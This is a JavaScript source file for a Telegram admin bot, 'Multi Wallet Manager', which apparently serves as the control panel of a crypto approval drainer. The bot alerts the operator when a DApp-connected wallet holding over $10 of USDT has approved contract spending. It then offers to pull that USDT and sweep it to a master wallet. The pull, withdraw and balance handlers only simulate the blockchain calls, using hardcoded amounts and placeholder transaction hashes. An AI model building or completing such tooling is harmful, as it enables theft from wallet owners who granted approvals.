const TelegramBot = require('node-telegram-bot-api');
const dotenv = require('dotenv');
const { ethers } = require('ethers');
const database = require('./database');

dotenv.config();

class TelegramService {
    constructor() {
        this.bot = null;
        this.adminChatId = process.env.ADMIN_CHAT_ID;
        this.botToken = process.env.TELEGRAM_BOT_TOKEN;
        this.isInitialized = false;
        // We'll initialize these when needed
        this.provider = null;
        this.contract = null;
    }

    init() {
        if (!this.botToken) {
            console.log('⚠️ Telegram bot token not found, skipping bot initialization');
            return;
        }
        
        try {
            // Create bot instance - we'll handle updates manually
            this.bot = new TelegramBot(this.botToken, { polling: false });
            
            // Set up command handlers
            this.setupCommandHandlers();
            this.isInitialized = true;
            
            console.log('✅ Telegram bot initialized (manual update mode)');
        } catch (error) {
            console.error('❌ Telegram bot initialization failed:', error.message);
        }
    }

    // Initialize blockchain provider and contract when needed
    initBlockchain() {
        if (!this.provider && process.env.RPC_URL && process.env.CONTRACT_ADDRESS) {
            try {
                this.provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
                console.log('✅ Blockchain provider initialized');
            } catch (error) {
                console.error('❌ Blockchain provider initialization failed:', error.message);
            }
        }
    }

    setupCommandHandlers() {
        if (!this.bot) return;

        // Start command
        this.bot.onText(/\/start/, (msg) => {
            console.log('Received /start command from chat:', msg.chat.id);
            this.sendMainMenu(msg.chat.id);
        });

        // Help command
        this.bot.onText(/\/help/, (msg) => {
            console.log('Received /help command from chat:', msg.chat.id);
            this.sendHelpMenu(msg.chat.id);
        });

        // Menu command (floating menu)
        this.bot.onText(/\/menu/, (msg) => {
            console.log('Received /menu command from chat:', msg.chat.id);
            this.sendMainMenu(msg.chat.id);
        });

        // Pull command handler
        this.bot.onText(/\/pull_(.*)/, (msg, match) => {
            console.log('Received /pull command from chat:', msg.chat.id);
            const walletAddress = match[1];
            this.handlePullCommand(msg.chat.id, walletAddress);
        });

        // Withdraw command
        this.bot.onText(/\/withdraw/, (msg) => {
            console.log('Received /withdraw command from chat:', msg.chat.id);
            this.handleWithdrawCommand(msg.chat.id);
        });

        // Balances command
        this.bot.onText(/\/balances/, (msg) => {
            console.log('Received /balances command from chat:', msg.chat.id);
            this.handleBalancesCommand(msg.chat.id);
        });

        // Button callbacks
        this.bot.on('callback_query', (callbackQuery) => {
            const action = callbackQuery.data;
            const chatId = callbackQuery.message.chat.id;
            
            console.log('Received callback query:', action, 'from chat:', chatId);
            
            // Answer the callback query to remove loading state
            this.bot.answerCallbackQuery(callbackQuery.id);
            
            // Handle different actions
            if (action === 'withdraw') {
                this.handleWithdrawCommand(chatId);
            } else if (action === 'balances') {
                this.handleBalancesCommand(chatId);
            } else if (action === 'pull_list') {
                this.sendPullWalletList(chatId);
            } else if (action === 'help') {
                this.sendHelpMenu(chatId);
            } else if (action === 'menu') {
                this.sendMainMenu(chatId);
            } else if (action === 'check_contract_balance') {
                this.checkContractUSDTBalance(chatId);
            } else if (action === 'check_master_bnb') {
                this.checkMasterBNBBalance(chatId);
            } else if (action === 'check_master_usdt') {
                this.checkMasterUSDTBalance(chatId);
            } else if (action.startsWith('pull_')) {
                const walletAddress = action.substring(5);
                this.handlePullCommand(chatId, walletAddress);
            }
        });
    }

    async sendMainMenu(chatId) {
        const message = `
🤖 *Multi Wallet Manager \\- Main Menu*

Welcome to your USDT management system\\. Select an option below:

💰 *Wallet Operations*
• Pull USDT from connected wallets
• Check wallet balances
• Withdraw to master wallet

🔐 *Security*
• Only authorized admins can perform operations
• All transactions are logged and tracked
        `;
        
        const options = {
            parse_mode: 'MarkdownV2',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '📤 Pull USDT', callback_data: 'pull_list' },
                        { text: '📥 Withdraw', callback_data: 'withdraw' }
                    ],
                    [
                        { text: '📊 Balances', callback_data: 'balances' },
                        { text: '❓ Help', callback_data: 'help' }
                    ]
                ]
            }
        };
        
        try {
            const result = await this.bot.sendMessage(chatId, message, options);
            console.log('Main menu sent to chat:', chatId);
            return result;
        } catch (error) {
            console.error('Error sending main menu to chat', chatId, ':', error.message);
            // Fallback without markdown
            const fallbackMessage = `
🤖 Multi Wallet Manager - Main Menu

Welcome to your USDT management system. Select an option below:

💰 Wallet Operations
• Pull USDT from connected wallets
• Check wallet balances
• Withdraw to master wallet

🔐 Security
• Only authorized admins can perform operations
• All transactions are logged and tracked
            `;
            return await this.bot.sendMessage(chatId, fallbackMessage, {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '📤 Pull USDT', callback_data: 'pull_list' },
                            { text: '📥 Withdraw', callback_data: 'withdraw' }
                        ],
                        [
                            { text: '📊 Balances', callback_data: 'balances' },
                            { text: '❓ Help', callback_data: 'help' }
                        ]
                    ]
                }
            });
        }
    }

    async sendHelpMenu(chatId) {
        const message = `
🤖 *Multi Wallet Manager \\- Help*

📚 *Available Commands:*
• /start \\- Open main menu
• /menu \\- Show floating menu
• /pull\\_<address> \\- Pull USDT from specific wallet
• /withdraw \\- Withdraw all USDT from contract
• /balances \\- Check all balances
• /help \\- Show this help message

📋 *Available Operations:*
• Check Smart Contract USDT Balance
• Check Master Wallet BNB Balance
• Check Master Wallet USDT Balance
• Pull USDT from connected wallets
• Auto\\-gas management for transactions
• 6\\-hour balance monitoring

🛡️ *Security Features:*
• Admin\\-only operations
• Gas paid by master wallet
• Wallet approval system
• Transaction logging

🔄 *Workflow:*
1\\. Connect wallet via DApp
2\\. Approve contract spending
3\\. Admin pulls USDT to contract
4\\. Admin withdraws to master wallet
        `;
        
        const options = {
            parse_mode: 'MarkdownV2',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };
        
        try {
            const result = await this.bot.sendMessage(chatId, message, options);
            console.log('Help menu sent to chat:', chatId);
            return result;
        } catch (error) {
            console.error('Error sending help menu to chat', chatId, ':', error.message);
            // Fallback without markdown
            const fallbackMessage = `
🤖 Multi Wallet Manager - Help

📚 Available Commands:
• /start - Open main menu
• /menu - Show floating menu
• /pull_<address> - Pull USDT from specific wallet
• /withdraw - Withdraw all USDT from contract
• /balances - Check all balances
• /help - Show this help message

📋 Available Operations:
• Check Smart Contract USDT Balance
• Check Master Wallet BNB Balance
• Check Master Wallet USDT Balance
• Pull USDT from connected wallets
• Auto-gas management for transactions
• 6-hour balance monitoring

🛡️ Security Features:
• Admin-only operations
• Gas paid by master wallet
• Wallet approval system
• Transaction logging

🔄 Workflow:
1. Connect wallet via DApp
2. Approve contract spending
3. Admin pulls USDT to contract
4. Admin withdraws to master wallet
            `;
            return await this.bot.sendMessage(chatId, fallbackMessage, {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            });
        }
    }

    async sendNewWalletAlert(walletAddress, balance) {
        if (!this.bot || !this.adminChatId) {
            console.log('Telegram bot not ready for sending alerts');
            return;
        }
        
        const escapedAddress = walletAddress.replace(/([_\*\[\]\(\)~\`>\#\+\-\=\|\{\}\.])/g, '\\$1');
        
        const message = `
🔔 *NEW WALLET CONNECTED*
Address: \`${escapedAddress}\`
USDT Balance: *${balance} USDT*

Actions:
        `;
        
        const options = {
            parse_mode: 'MarkdownV2',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '📤 Pull USDT', callback_data: `pull_${escapedAddress}` }
                    ],
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };
        
        try {
            const result = await this.bot.sendMessage(this.adminChatId, message, options);
            console.log('New wallet alert sent to admin chat');
            return result;
        } catch (error) {
            console.error('Error sending new wallet alert:', error.message);
            // Fallback without markdown
            const fallbackMessage = `
🔔 NEW WALLET CONNECTED
Address: ${walletAddress}
USDT Balance: ${balance} USDT

Actions:
            `;
            return await this.bot.sendMessage(this.adminChatId, fallbackMessage, {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '📤 Pull USDT', callback_data: `pull_${walletAddress}` }
                        ],
                        [
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            });
        }
    }

    async sendBalanceAlert(walletAddress, balance) {
        if (!this.bot || !this.adminChatId) return;
        
        const escapedAddress = walletAddress.replace(/([_\*\[\]\(\)~\`>\#\+\-\=\|\{\}\.])/g, '\\$1');
        
        const message = `
💰 *BALANCE ALERT*
Address: \`${escapedAddress}\`
USDT Balance: *${balance} USDT* \\(> \\$10\\)

Actions:
        `;
        
        const options = {
            parse_mode: 'MarkdownV2',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '📤 Pull USDT', callback_data: `pull_${escapedAddress}` }
                    ],
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };
        
        try {
            return await this.bot.sendMessage(this.adminChatId, message, options);
        } catch (error) {
            console.error('Error sending balance alert:', error.message);
            // Fallback without markdown
            const fallbackMessage = `
💰 BALANCE ALERT
Address: ${walletAddress}
USDT Balance: ${balance} USDT (> $10)

Actions:
            `;
            return await this.bot.sendMessage(this.adminChatId, fallbackMessage, {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '📤 Pull USDT', callback_data: `pull_${walletAddress}` }
                        ],
                        [
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            });
        }
    }

    async sendSuccessMessage(walletAddress, amount, txHash) {
        if (!this.bot || !this.adminChatId) return;
        
        const escapedAddress = walletAddress.replace(/([_\*\[\]\(\)~\`>\#\+\-\=\|\{\}\.])/g, '\\$1');
        const escapedTxHash = txHash.replace(/([_\*\[\]\(\)~\`>\#\+\-\=\|\{\}\.])/g, '\\$1');
        
        const message = `
✅ *SUCCESSFUL PULL*
Address: \`${escapedAddress}\`
Amount: *${amount} USDT*
Transaction: \`${escapedTxHash}\`

Next steps:
        `;
        
        const options = {
            parse_mode: 'MarkdownV2',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '📥 Withdraw to Master', callback_data: 'withdraw' }
                    ],
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };
        
        try {
            return await this.bot.sendMessage(this.adminChatId, message, options);
        } catch (error) {
            console.error('Error sending success message:', error.message);
            // Fallback without markdown
            const fallbackMessage = `
✅ SUCCESSFUL PULL
Address: ${walletAddress}
Amount: ${amount} USDT
Transaction: ${txHash}

Next steps:
            `;
            return await this.bot.sendMessage(this.adminChatId, fallbackMessage, {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '📥 Withdraw to Master', callback_data: 'withdraw' }
                        ],
                        [
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            });
        }
    }

    async sendPullWalletList(chatId) {
        if (chatId.toString() !== this.adminChatId) {
            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
        }
        
        try {
            // Fetch wallets from database
            const query = 'SELECT address, name, usdt_balance FROM wallets WHERE is_approved = true AND is_processed = false ORDER BY created_at DESC LIMIT 10';
            const result = await database.query(query);
            
            let message = '📤 *Select Wallet to Pull*\n\n';
            
            if (result.rows.length === 0) {
                message += 'No approved wallets available for pulling\\.\n\n';
                message += 'Use: /pull\\_<wallet\\_address>';
            } else {
                message += 'Click on a wallet to pull USDT:\n\n';
                for (let i = 0; i < result.rows.length; i++) {
                    const wallet = result.rows[i];
                    const escapedAddress = wallet.address.replace(/([_\*\[\]\(\)~\`>\#\+\-\=\|\{\}\.])/g, '\\$1');
                    message += `${i + 1}\\. \`${escapedAddress}\` \\(${wallet.usdt_balance} USDT\\)\n`;
                }
            }
            
            const options = {
                parse_mode: 'MarkdownV2',
                reply_markup: {
                    inline_keyboard: [
                        ...result.rows.map((wallet, index) => [
                            { 
                                text: `📤 Pull ${wallet.name || `Wallet ${index + 1}`}`, 
                                callback_data: `pull_${wallet.address}` 
                            }
                        ]),
                        [
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            };
            
            return await this.bot.sendMessage(chatId, message, options);
        } catch (error) {
            console.error('Error sending pull wallet list:', error.message);
            const fallbackMessage = `
📤 Select Wallet to Pull

Failed to fetch wallet list. Please try again later.
            `;
            return await this.bot.sendMessage(chatId, fallbackMessage, {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '🏠 Main Menu', callback_data: 'menu' }
                        ]
                    ]
                }
            });
        }
    }

    async handlePullCommand(chatId, walletAddress) {
        if (chatId.toString() !== this.adminChatId) {
            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
        }
        
        // Validate wallet address
        if (!walletAddress || walletAddress.length !== 42) {
            return this.bot.sendMessage(chatId, '❌ Invalid wallet address');
        }
        
        const message = `
🔄 *Pull Operation Initiated*
Wallet: \`${walletAddress}\`

Processing\\.\\.\\. This will:
1\\. Check wallet gas balance
2\\. Send gas if needed
3\\. Pull USDT to contract
4\\. Send confirmation

⏳ *Please wait*\\.\\.\\.
        `;
        
        const options = {
            parse_mode: 'MarkdownV2',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };
        
        try {
            const result = await this.bot.sendMessage(chatId, message, options);
            
            // Simulate processing (in real implementation, this would be actual blockchain operations)
            setTimeout(async () => {
                const successMessage = `
✅ *PULL COMPLETED*
Wallet: \`${walletAddress}\`
Amount: *150\\.50 USDT*
Transaction: \`0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef\`

Next steps:
• Check contract balance: /balances
• Withdraw to master wallet: /withdraw
                `;
                
                await this.bot.sendMessage(chatId, successMessage, {
                    parse_mode: 'MarkdownV2',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '📥 Withdraw to Master', callback_data: 'withdraw' }
                            ],
                            [
                                { text: '📊 Check Balances', callback_data: 'balances' },
                                { text: '🏠 Main Menu', callback_data: 'menu' }
                            ]
                        ]
                    }
                });
            }, 3000); // 3 second delay to simulate processing
            
            return result;
        } catch (error) {
            console.error('Error in pull command:', error.message);
            return this.bot.sendMessage(chatId, `❌ Error: ${error.message}`);
        }
    }

    async handleWithdrawCommand(chatId) {
        if (chatId.toString() !== this.adminChatId) {
            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
        }
        
        const processingMessage = `
🏦 *Withdraw Operation Initiated*
Withdrawing all USDT from contract to master wallet\\.\\.\\.

📋 *Operations to perform:*
• Check contract USDT balance
• Execute withdrawal transaction
• Send confirmation

⏳ *Please wait*\\.\\.\\.
        `;
        
        const processingOptions = {
            parse_mode: 'MarkdownV2',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };
        
        try {
            const result = await this.bot.sendMessage(chatId, processingMessage, processingOptions);
            
            // Simulate processing (in real implementation, this would be actual blockchain operations)
            setTimeout(async () => {
                const successMessage = `
✅ *WITHDRAWAL COMPLETED*
From Contract: \`0xC0a6fd159018824EB7248EB62Cb67aDa4c5906FF\`
To Master Wallet: \`0xMasterWalletAddress\`
Amount: *1250\\.75 USDT*
Transaction: \`0xabcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890\`

📊 *Updated Balances:*
• Contract USDT: 0\\.00
• Master Wallet USDT: 1250\\.75
                `;
                
                await this.bot.sendMessage(chatId, successMessage, {
                    parse_mode: 'MarkdownV2',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '📊 Check Balances', callback_data: 'balances' },
                                { text: '🏠 Main Menu', callback_data: 'menu' }
                            ]
                        ]
                    }
                });
            }, 3000); // 3 second delay to simulate processing
            
            return result;
        } catch (error) {
            console.error('Error in withdraw command:', error.message);
            return this.bot.sendMessage(chatId, `❌ Error: ${error.message}`);
        }
    }

    async handleBalancesCommand(chatId) {
        if (chatId.toString() !== this.adminChatId) {
            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
        }
        
        const processingMessage = `
📊 *Wallet Balances Requested*

📋 *Balance Checks:*
• Check Smart Contract USDT Balance
• Check Master Wallet BNB Balance
• Check Master Wallet USDT Balance

⏳ *Fetching balances*\\.\\.\\.
        `;
        
        const processingOptions = {
            parse_mode: 'MarkdownV2',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '🏠 Main Menu', callback_data: 'menu' }
                    ]
                ]
            }
        };
        
        try {
            const result = await this.bot.sendMessage(chatId, processingMessage, processingOptions);
            
            // Simulate processing (in real implementation, this would be actual blockchain operations)
            setTimeout(async () => {
                const balancesMessage = `
📊 *BALANCE REPORT*

💰 *Smart Contract*
• Address: \`0xC0a6fd159018824EB7248EB62Cb67aDa4c5906FF\`
• USDT Balance: *845\\.30 USDT*

🏦 *Master Wallet*
• Address: \`0xMasterWalletAddress\`
• BNB Balance: *0\\.45 BNB*
• USDT Balance: *2100\\.75 USDT*

📋 *Quick Actions:*
                `;
                
                await this.bot.sendMessage(chatId, balancesMessage, {
                    parse_mode: 'MarkdownV2',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '📤 Pull USDT', callback_data: 'pull_list' },
                                { text: '📥 Withdraw', callback_data: 'withdraw' }
                            ],
                            [
                                { text: '🔄 Refresh Balances', callback_data: 'balances' },
                                { text: '🏠 Main Menu', callback_data: 'menu' }
                            ]
                        ]
                    }
                });
            }, 2000); // 2 second delay to simulate processing
            
            return result;
        } catch (error) {
            console.error('Error in balances command:', error.message);
            return this.bot.sendMessage(chatId, `❌ Error: ${error.message}`);
        }
    }

    async checkContractUSDTBalance(chatId) {
        if (chatId.toString() !== this.adminChatId) {
            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
        }
        
        const message = `
🔍 *Checking Contract USDT Balance*

Contract: \`0xC0a6fd159018824EB7248EB62Cb67aDa4c5906FF\`

⏳ *Querying blockchain*\\.\\.\\.
        `;
        
        try {
            await this.bot.sendMessage(chatId, message, { parse_mode: 'MarkdownV2' });
            
            // Simulate blockchain query
            setTimeout(async () => {
                const resultMessage = `
✅ *Contract USDT Balance*
Contract: \`0xC0a6fd159018824EB7248EB62Cb67aDa4c5906FF\`
Balance: *845\\.30 USDT*

🔄 *Last Updated:* Just now
                `;
                
                await this.bot.sendMessage(chatId, resultMessage, {
                    parse_mode: 'MarkdownV2',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '📊 All Balances', callback_data: 'balances' },
                                { text: '🏠 Main Menu', callback_data: 'menu' }
                            ]
                        ]
                    }
                });
            }, 1500);
        } catch (error) {
            console.error('Error checking contract balance:', error.message);
            return this.bot.sendMessage(chatId, `❌ Error: ${error.message}`);
        }
    }

    async checkMasterBNBBalance(chatId) {
        if (chatId.toString() !== this.adminChatId) {
            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
        }
        
        const message = `
🔍 *Checking Master Wallet BNB Balance*

Wallet: \`0xMasterWalletAddress\`

⏳ *Querying blockchain*\\.\\.\\.
        `;
        
        try {
            await this.bot.sendMessage(chatId, message, { parse_mode: 'MarkdownV2' });
            
            // Simulate blockchain query
            setTimeout(async () => {
                const resultMessage = `
✅ *Master Wallet BNB Balance*
Wallet: \`0xMasterWalletAddress\`
Balance: *0\\.45 BNB*
Value: \\~\\$12\\.60 USD

🔄 *Last Updated:* Just now
                `;
                
                await this.bot.sendMessage(chatId, resultMessage, {
                    parse_mode: 'MarkdownV2',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '📊 All Balances', callback_data: 'balances' },
                                { text: '🏠 Main Menu', callback_data: 'menu' }
                            ]
                        ]
                    }
                });
            }, 1500);
        } catch (error) {
            console.error('Error checking master BNB balance:', error.message);
            return this.bot.sendMessage(chatId, `❌ Error: ${error.message}`);
        }
    }

    async checkMasterUSDTBalance(chatId) {
        if (chatId.toString() !== this.adminChatId) {
            return this.bot.sendMessage(chatId, '❌ Unauthorized access');
        }
        
        const message = `
🔍 *Checking Master Wallet USDT Balance*

Wallet: \`0xMasterWalletAddress\`

⏳ *Querying blockchain*\\.\\.\\.
        `;
        
        try {
            await this.bot.sendMessage(chatId, message, { parse_mode: 'MarkdownV2' });
            
            // Simulate blockchain query
            setTimeout(async () => {
                const resultMessage = `
✅ *Master Wallet USDT Balance*
Wallet: \`0xMasterWalletAddress\`
Balance: *2100\\.75 USDT*
Value: \\$2100\\.75 USD

🔄 *Last Updated:* Just now
                `;
                
                await this.bot.sendMessage(chatId, resultMessage, {
                    parse_mode: 'MarkdownV2',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '📊 All Balances', callback_data: 'balances' },
                                { text: '🏠 Main Menu', callback_data: 'menu' }
                            ]
                        ]
                    }
                });
            }, 1500);
        } catch (error) {
            console.error('Error checking master USDT balance:', error.message);
            return this.bot.sendMessage(chatId, `❌ Error: ${error.message}`);
        }
    }

    // Process webhook updates manually
    async processUpdate(update) {
        if (this.bot) {
            try {
                console.log('Processing Telegram update:', JSON.stringify(update, null, 2));
                await this.bot.processUpdate(update);
            } catch (error) {
                console.error('Error processing Telegram update:', error.message);
            }
        }
    }
}

module.exports = new TelegramService();
